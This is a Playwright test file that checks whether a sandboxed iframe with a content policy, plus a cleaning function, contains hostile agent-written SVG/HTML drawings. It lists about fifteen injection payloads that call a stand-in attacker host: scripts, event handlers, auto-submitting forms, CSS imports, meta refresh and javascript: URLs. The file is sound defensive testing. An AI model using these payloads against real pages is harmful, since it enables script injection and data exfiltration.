/**
 * FE-OR-T220: a hostile drawing, loaded the way the Outcome Review loads one, in a real browser.
 *
 * The drawing is HTML or SVG written by an agent. Even if the server's own check were skipped, loading it must not run anything,
 * reach the network, change the page that holds it, or navigate that page. Two paths are tried: the one the screen takes (the
 * drawing cleaned by buildArtifactSrcdoc, in an empty sandbox with a content policy) and the sandbox and policy alone, with the
 * cleaning left out, for the attacks they stop by themselves. An attack only the cleaning stops (a meta refresh, a link followed
 * inside its own frame) is marked as such.
 *
 *   npx playwright test -c tests/configs/playwright.review-artifact.config.ts
 */
import path from 'node:path'
import { buildSync } from 'esbuild'
import { expect, test, type Page } from '@playwright/test'

const ENTRY = path.resolve(
  __dirname,
  '../../../../../frontend/src/renderer/src/components/request/outcome-review/artifact/review-artifact-srcdoc.ts'
)
const BUNDLE = buildSync({
  entryPoints: [ENTRY],
  bundle: true,
  format: 'iife',
  globalName: 'ReviewSrcdoc',
  write: false
}).outputFiles[0].text
const HOST = 'http://orca-host.test/'
const EVIL = 'evil.test'

type Attack = {
  name: string
  html: string
  stoppedBy: 'sandbox-and-policy' | 'cleaning-only'
  click?: string
}

const ATTACKS: Attack[] = [
  {
    name: 'script',
    html: '<svg><script>window.top.__pwned = 1; fetch("http://evil.test/s")</script><rect width="5" height="5"/></svg>',
    stoppedBy: 'sandbox-and-policy'
  },
  {
    name: 'onload and onclick',
    html: '<svg onload="fetch(\'http://evil.test/o\')"><rect width="9" height="9" onclick="fetch(\'http://evil.test/c\')"/></svg>',
    stoppedBy: 'sandbox-and-policy',
    click: 'rect'
  },
  {
    name: 'svg script',
    html: '<svg xmlns="http://www.w3.org/2000/svg"><script type="text/javascript">parent.document.body.innerHTML="pwned"</script></svg>',
    stoppedBy: 'sandbox-and-policy'
  },
  {
    name: 'foreignObject with an image and a frame',
    html: '<svg><foreignObject width="50" height="50"><img src="http://evil.test/i.png"><iframe src="http://evil.test/f"></iframe></foreignObject></svg>',
    stoppedBy: 'sandbox-and-policy'
  },
  {
    name: 'self-submitting form',
    html: '<form id="f" action="http://evil.test/post" method="post"><input name="a" value="b"></form><script>document.getElementById("f").submit()</script><svg/>',
    stoppedBy: 'sandbox-and-policy'
  },
  {
    name: 'form that targets the top page',
    html: '<form id="f" action="http://evil.test/top" method="post" target="_top"><button id="b">x</button></form><svg/>',
    stoppedBy: 'sandbox-and-policy',
    click: '#b'
  },
  {
    name: 'stylesheet import and url()',
    html: '<svg><style>@import url("http://evil.test/s.css"); rect{fill:url(http://evil.test/p.png)}</style><rect width="4" height="4" style="background:url(http://evil.test/q)"/></svg>',
    stoppedBy: 'sandbox-and-policy'
  },
  {
    name: 'linked stylesheet',
    html: '<html><head><link rel="stylesheet" href="http://evil.test/l.css"></head><body><svg/></body></html>',
    stoppedBy: 'sandbox-and-policy'
  },
  {
    name: 'image and use of another origin',
    html: '<svg><image href="http://evil.test/a.svg" width="4" height="4"/><use href="http://evil.test/a.svg#x"/></svg>',
    stoppedBy: 'sandbox-and-policy'
  },
  {
    name: 'object and embed',
    html: '<object data="http://evil.test/o"></object><embed src="http://evil.test/e"><svg/>',
    stoppedBy: 'sandbox-and-policy'
  },
  {
    name: 'base then a relative image',
    html: '<html><head><base href="http://evil.test/"></head><body><svg><image href="rel.png" width="4" height="4"/></svg></body></html>',
    stoppedBy: 'sandbox-and-policy'
  },
  {
    name: 'link to the top page',
    html: '<svg width="80" height="40"><a href="http://evil.test/top" target="_top"><rect id="r" width="80" height="40"/></a></svg>',
    stoppedBy: 'sandbox-and-policy',
    click: '#r'
  },
  {
    name: 'meta refresh',
    html: '<html><head><meta http-equiv="refresh" content="0;url=http://evil.test/m"></head><body><svg/></body></html>',
    stoppedBy: 'cleaning-only'
  },
  {
    name: 'link followed inside its own frame',
    html: '<svg width="80" height="40"><a href="http://evil.test/self"><rect id="r" width="80" height="40"/></a></svg>',
    stoppedBy: 'cleaning-only',
    click: '#r'
  },
  {
    name: 'javascript url',
    html: '<svg width="80" height="40"><a href="javascript:window.top.__pwned=1"><rect id="r" width="80" height="40"/></a></svg>',
    stoppedBy: 'sandbox-and-policy',
    click: '#r'
  }
]

async function load(page: Page, requests: string[]): Promise<void> {
  await page.route('**/*', async (route) => {
    const url = route.request().url()
    if (url === HOST) {
      await route.fulfill({
        contentType: 'text/html',
        body: '<!doctype html><html><body><div id="canary">untouched</div><div id="slot"></div><script>window.__pwned = undefined; window.addEventListener("beforeunload", () => { window.__unloading = true })</script></body></html>'
      })
      return
    }
    requests.push(url)
    await route.abort()
  })
  await page.goto(HOST)
  await page.addScriptTag({ content: BUNDLE })
}

async function show(page: Page, srcdoc: string): Promise<void> {
  // The same attributes ReviewArtifactView puts on its frame.
  await page.evaluate((doc) => {
    const frame = document.createElement('iframe')
    frame.setAttribute('sandbox', '')
    frame.setAttribute('referrerpolicy', 'no-referrer')
    frame.setAttribute('title', 'drawing')
    frame.style.cssText = 'width:400px;height:200px'
    frame.srcdoc = doc
    document.getElementById('slot')!.appendChild(frame)
  }, srcdoc)
  await page.waitForTimeout(700)
}

async function expectContained(page: Page, requests: string[], click?: string): Promise<void> {
  if (click) {
    await page
      .frameLocator('iframe')
      .locator(click)
      .first()
      .click({ timeout: 2_000, force: true })
      .catch(() => undefined)
    await page.waitForTimeout(500)
  }
  expect(
    requests.filter((u) => u.includes(EVIL)),
    'a request left for the attacker'
  ).toEqual([])
  expect(page.url(), 'the host page was navigated').toBe(HOST)
  expect(await page.evaluate(() => document.getElementById('canary')!.textContent)).toBe(
    'untouched'
  )
  expect(
    await page.evaluate(() => (window as unknown as { __pwned?: unknown }).__pwned)
  ).toBeUndefined()
  expect(
    await page.evaluate(() => (window as unknown as { __unloading?: boolean }).__unloading)
  ).toBeUndefined()
  // The frame has its own opaque origin: the page cannot read into it, nor it into the page.
  expect(await page.evaluate(() => document.querySelector('iframe')!.contentDocument)).toBeNull()
}

test.describe('a hostile drawing in the Outcome Review frame', () => {
  for (const attack of ATTACKS) {
    test(`${attack.name}: cleaned, sandboxed and under policy`, async ({ page }) => {
      const requests: string[] = []
      await load(page, requests)
      const srcdoc = await page.evaluate(
        ({ html }) =>
          (
            window as unknown as { ReviewSrcdoc: { buildArtifactSrcdoc: (i: unknown) => string } }
          ).ReviewSrcdoc.buildArtifactSrcdoc({ html, tokens: {}, theme: 'light' }),
        { html: attack.html }
      )
      await show(page, srcdoc)
      await expectContained(page, requests, attack.click)
    })

    if (attack.stoppedBy === 'sandbox-and-policy') {
      test(`${attack.name}: even with the cleaning left out, the sandbox and the policy hold`, async ({
        page
      }) => {
        const requests: string[] = []
        await load(page, requests)
        const raw = await page.evaluate(
          (html) =>
            `<meta http-equiv="Content-Security-Policy" content="${(window as unknown as { ReviewSrcdoc: { ARTIFACT_CSP: string } }).ReviewSrcdoc.ARTIFACT_CSP}">${html}`,
          attack.html
        )
        await show(page, raw)
        await expectContained(page, requests, attack.click)
      })
    }
  }

  // Without this the other tests could pass because the harness sees nothing. A frame that is allowed to run scripts, with no
  // policy, must be seen reaching the attacker; if it is not, the harness is blind and none of the results above mean anything.
  test('control: a frame that may run scripts and has no policy is caught reaching the attacker', async ({
    page
  }) => {
    const requests: string[] = []
    await load(page, requests)
    await page.evaluate(() => {
      const frame = document.createElement('iframe')
      frame.setAttribute('sandbox', 'allow-scripts')
      frame.srcdoc = '<script>fetch("http://evil.test/control")</script>'
      document.getElementById('slot')!.appendChild(frame)
    })
    await page.waitForTimeout(700)
    expect(requests.filter((u) => u.includes(EVIL))).not.toEqual([])
  })

  test('a clean drawing is drawn: the frame holds the shapes and the tokens', async ({ page }) => {
    const requests: string[] = []
    await load(page, requests)
    const srcdoc = await page.evaluate(() =>
      (
        window as unknown as { ReviewSrcdoc: { buildArtifactSrcdoc: (i: unknown) => string } }
      ).ReviewSrcdoc.buildArtifactSrcdoc({
        html: '<svg viewBox="0 0 100 50" width="100" height="50"><rect id="ok" width="100" height="50" fill="var(--rv-diff-add, #123456)"/></svg>',
        tokens: { '--rv-diff-add': 'rgb(0, 128, 0)' },
        theme: 'dark'
      })
    )
    await show(page, srcdoc)
    const fill = await page
      .frameLocator('iframe')
      .locator('#ok')
      .evaluate((el) => getComputedStyle(el).fill)
    expect(fill).toBe('rgb(0, 128, 0)')
    expect(requests).toEqual([])
  })
})
